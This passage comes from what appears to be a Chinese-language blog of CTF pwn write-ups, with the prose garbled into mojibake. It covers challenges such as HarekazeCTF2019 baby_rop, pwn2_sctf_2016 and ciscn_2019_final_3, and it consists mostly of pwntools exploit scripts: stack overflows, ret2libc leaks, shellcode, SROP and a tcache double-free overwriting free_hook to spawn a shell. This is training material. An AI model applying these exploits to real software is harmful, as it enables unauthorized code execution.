</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>stack</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>syscall</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>2</span><span class=p>,</span><span class=n>mov_rax_0f</span><span class=p>,</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=harekazectf2019baby_rop>[HarekazeCTF2019]baby_rop</h3><p>å‘ç° <code>main</code> é‡Œæœ‰ <code>system</code>ï¼Œç„¶åè¿˜æ‰¾åˆ°äº† <code>/bin/sh</code> å­—ç¬¦ä¸²å’Œ <code>pop rdi</code> çš„ gadgetï¼Œé‚£å°±è€åŠæ³•ä¼ å‚å°±è¡Œäº†ï¼Œå°±æ˜¯ getshell ä¹‹åéœ€è¦æ‰¾ä¸€ä¸‹ flag çš„ä½ç½®ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=mh>0x601048</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400683</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=pwn2_sctf_2016>pwn2_sctf_2016</h3><p>æœ¬é¢˜å…ˆä¼šè®©ç”¨æˆ·è®¾ç½®è¯»å…¥æ•°æ®é•¿åº¦ï¼Œå¦‚æœå¤§äº 32 åˆ™é€€å‡ºã€‚ç”±äºå®ƒè‡ªå·±å®ç°çš„ <code>get_n</code> å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>unsigned int</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œå› æ­¤å¯ä»¥è¾“å…¥ <code>-1</code> äº§ç”Ÿæ ˆæº¢å‡ºæ¼æ´ã€‚ç„¶å ret2libc å°±å¥½ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;read?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;-1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;data!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>you_said_s</span> <span class=o>=</span> <span class=mh>0x80486f8</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x2c</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>],</span><span class=n>you_said_s</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;You said:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;You said:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>printf</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;printf&#39;</span><span class=p>,</span><span class=n>printf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>printf</span><span class=p>,</span><span class=s1>&#39;printf&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;read?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;-1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;data!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x2c</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ez_pz_hackover_2016>ez_pz_hackover_2016</h3><p>è¿™é¢˜è¦æ±‚å­—ç¬¦ä¸² <code>s</code> ä»¥ <code>crackme\x00</code> å¼€å¤´ï¼Œéšåä¼šæ‰§è¡Œ <code>memcpy</code> å°†æˆ‘ä»¬çš„è¾“å…¥å¤åˆ¶åˆ°ä¸€ä¸ª <code>dest</code> ä½ç½®ã€‚æˆ‘ä»¬é€šè¿‡ gdb è°ƒè¯•å¯ä»¥æµ‹å‡ºå…¶è·ç¦» ebp è·ç¦»ä¸º 22ï¼Œè¦è¦†ç›–åˆ°è¿”å›åœ°å€åˆ™éœ€è¦ 26 å­—èŠ‚ã€‚è‡³äºè¿”å›åœ°å€ï¼Œé¢˜ç›®æä¾›äº†å­—ç¬¦ä¸² <code>s</code> çš„åœ°å€ï¼Œä½†æ˜¯ç›´æ¥ä»¥å®ƒä½œä¸ºè¿”å›åœ°å€ä¼šå¤±è´¥ï¼Œgdb è°ƒè¯•åˆ° <code>vuln</code> å‡½æ•°ä¸­çš„ <code>ret</code> è¯­å¥çš„æ—¶å€™ä¼šå‘ç°ï¼Œè¿”å›åœ°å€ä½äº <code>0xffca41dc</code>ï¼Œè€Œæˆ‘ä»¬å†™å…¥çš„æ•°æ®ä½äº <code>0xffca41c0</code>ï¼Œç›¸å·® <code>0x1c</code>ï¼Œå› æ­¤è¿˜éœ€è¦è€ƒè™‘è¯¥åç§»é‡ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;crash:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ss</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;ss&#39;</span><span class=p>,</span><span class=n>ss</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;crashme</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>26</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>ss</span><span class=o>-</span><span class=mh>0x1c</span><span class=p>)</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_ne_5>ciscn_2019_ne_5</h3><p>æœ¬é¢˜æœ‰ <code>GetFlag</code> çš„åé—¨ï¼Œæœ‰ä¸€ä¸ª <code>memcpy</code> çš„æ“ä½œï¼Œæ­¤æ—¶éœ€è¦å…³æ³¨çš„åç§»å®é™…ä¸Šæ˜¯ <code>dest</code> åˆ° <code>ebp</code> çš„è·ç¦»ã€‚ç®¡ç†å‘˜å¯†ç å¯ç›´æ¥é€šè¿‡åç¼–è¯‘å¾—åˆ°ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=mh>0x80482ea</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;password:&#39;</span><span class=p>,</span><span class=s1>&#39;administrator&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Exit</span><span class=se>\n</span><span class=s1>:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;info:&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Exit</span><span class=se>\n</span><span class=s1>:&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=harekazectf2019baby_rop2>[HarekazeCTF2019]baby_rop2</h3><p>é¢˜ç›®ç»™å®šäº† libcï¼Œç»“åˆé¢˜ç›®åå¯ä»¥æƒ³åˆ° ret2libcï¼Œè¿™é‡Œåªèƒ½è°ƒç”¨ <code>printf</code> æ¥æ‰“å°å‡½æ•° GOT åœ°å€ï¼Œå…¶ä½™å’Œå¸¸è§„ ret2libc ç›¸åŒã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400733</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name?&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;read&#39;</span><span class=p>,</span> <span class=n>read</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span> <span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>read</span><span class=p>,</span><span class=s1>&#39;read&#39;</span><span class=p>,</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name?&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_n_5>ciscn_2019_n_5</h3><p>æœ¬é¢˜æ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼Œå› æ­¤æ–¹æ³•å¤šæ ·ï¼Œä¾‹å¦‚ ret2libcï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;merc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400713</span>
</span></span><span class=line><span class=cl><span class=c1>#ret = 0x4004c9</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;me?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;read&#39;</span><span class=p>,</span><span class=n>read</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;merc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span> <span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>read</span><span class=p>,</span><span class=s1>&#39;read&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;me?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆ–è€…æ›´ç®€å•çš„ ret2shellcodeï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=mh>0x601080</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;me?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ç”±äºè¿œç¨‹ libc ç‰ˆæœ¬å’Œæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶çš„ç‰ˆæœ¬ä¸åŒï¼Œæ‰“è¿œç¨‹æ—¶æ¨èä½¿ç”¨ ret2shellcodeï¼Œæ„Ÿè§‰è¿™ä¸ªæ›´æ¥è¿‘é¢„æœŸè§£ã€‚</p><h3 id=ciscn_2019_final_3>ciscn_2019_final_3</h3><p>æä¾›äº† libcï¼Œå‘ç°æ˜¯ 2.27 ç‰ˆæœ¬çš„ï¼Œè€ƒè™‘å’Œ tcache åˆ©ç”¨æœ‰å…³ã€‚</p><p>ç¨‹åºæä¾›äº† <code>add</code> å’Œ <code>remove</code> ä¸¤ä¸ªåŠŸèƒ½ï¼Œé¦–å…ˆ <code>add</code> åªèƒ½åˆ›å»ºå°äº 0x78 å­—èŠ‚çš„ chunkï¼Œä¸”æœ€å¤šåˆ›å»º 0x18 ä¸ª chunkã€‚<code>gift</code> ä¼šè¿”å›åˆ†é…åˆ°çš„å†…å­˜åœ°å€ã€‚è€Œåœ¨ <code>remove</code> ä¸­ï¼Œ<code>free</code> ä¹‹åæ²¡æœ‰å°†æŒ‡é’ˆç½® nullï¼Œå­˜åœ¨ double freeã€‚</p><p>ç”±äºé¢˜ç›®ç»™äº† libcï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½æ³„éœ² libc åœ°å€ï¼Œè¿™å°±éœ€è¦ tcache ä¸­æŸèŠ‚ç‚¹çš„ fd æŒ‡å‘ libcã€‚è€Œæˆ‘ä»¬çŸ¥é“ï¼Œunsorted bin æŒ‡å‘ <code>main_arena</code> çš„æŒ‡é’ˆæ˜¯æŒ‡å‘ libc çš„ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½æŠŠè¿™ä¸ªæŒ‡é’ˆç»™ tcache ä¸­æŸèŠ‚ç‚¹çš„ fd å‘¢ï¼Ÿ</p><p>ç”±äº 0x78 å­—èŠ‚çš„é™åˆ¶æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ›å»ºé€‚åˆæ”¾å…¥ unsorted bin ä¸­çš„ chunkï¼Œå› æ­¤éœ€è¦å…ˆåˆå¹¶å°å †å—ï¼Œç„¶åä¿®æ”¹ <code>chunk0</code> çš„ <code>chunk_size</code> æŠŠä»–å˜æˆä¸€ä¸ªå¤§å †å—ã€‚é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹è¿™ä¸ª <code>chunk_size</code> å­—æ®µï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ° double freeï¼Œå‡è®¾æˆ‘ä»¬è¿ç»­ç”³è¯·å †å—ç”³è¯·åˆ°äº† <code>chunk11</code>ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>chunk0</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>æ³¨ï¼šç¬¬äºŒæ¬¡åˆ†é…äº† 0x18 å­—èŠ‚æ˜¯ 64 ä½ä¸‹æœ€å°åˆ†é…å¤§å°ã€‚è¿™ä¸ª <code>chunk1</code> çš„åˆ†é…æ˜¯ä¸ºäº†è®© unsorted bin ä¸ tcache é”™ä½ã€‚</p></blockquote><p>é‚£ä¹ˆè¿™æ—¶è¿ç»­ä¸¤æ¬¡ <code>free</code> æ‰ <code>chunk11</code>ï¼Œå† <code>add</code> å›æ¥ï¼Œä½¿å¾— <code>chunk11->fd = chunk0-0x10</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨ <code>chunk0-0x10</code> å¤„ä¼ªé€ äº†ä¸€ä¸ªå †å—ï¼Œå†æ¬¡ <code>add</code> å°±ä¼šåˆ†é…åˆ° <code>chunk0-0x10</code>ï¼Œæ­¤æ—¶å¡«å…¥å‡†å¤‡å¥½çš„ <code>prev_size</code> åŠ <code>chunk_size</code> å³å¯ä¿®æ”¹ <code>chunk0</code> å¤§å°ã€‚æ³¨æ„ä¸ºäº†ç¡®ä¿é‡Šæ”¾åè¿›å…¥ unsorted binï¼Œ<code>chunk_size</code> éœ€å¤§äº 0x400 å­—èŠ‚ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>chunk0</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span> <span class=c1># chunk11-&gt;fd = chunk0-0x10</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>chunk0</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x4a1</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>éšåæˆ‘ä»¬é‡Šæ”¾ <code>chunk0</code> å°±ä¼šè¿›å…¥ unsorted binï¼Œè€Œé‡Šæ”¾ <code>chunk1</code> ä¼šè¿›å…¥ <code>tcache[0]</code>ã€‚æ­¤æ—¶ <code>add</code> å°±ä¼šå¾—åˆ° <code>chunk0</code>ï¼Œå¹¶ä½¿å¾— <code>chunk1->fd = main_arena</code>ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸€æ¬¡ <code>add</code> å¾—åˆ° <code>chunk1</code>ï¼Œä¸‹ä¸€æ¬¡ <code>add</code> å¾—åˆ° <code>main_arena</code>ï¼Œå‡å»åç§»é‡å³ libc åŸºå€ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># tcache[0]</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>)</span> <span class=c1># chunk0; chunk1-&gt;fd = main_arena</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># chunk1</span>
</span></span><span class=line><span class=cl><span class=n>main_arena</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=mh>0x3ebca0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span> <span class=n>base</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ€åå†æ¬¡åˆ©ç”¨ double freeï¼Œç”¨ <code>one_gadget</code> è¦†ç›– <code>free_hook</code>ï¼Œå†æ¬¡è°ƒç”¨ <code>remove</code> å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
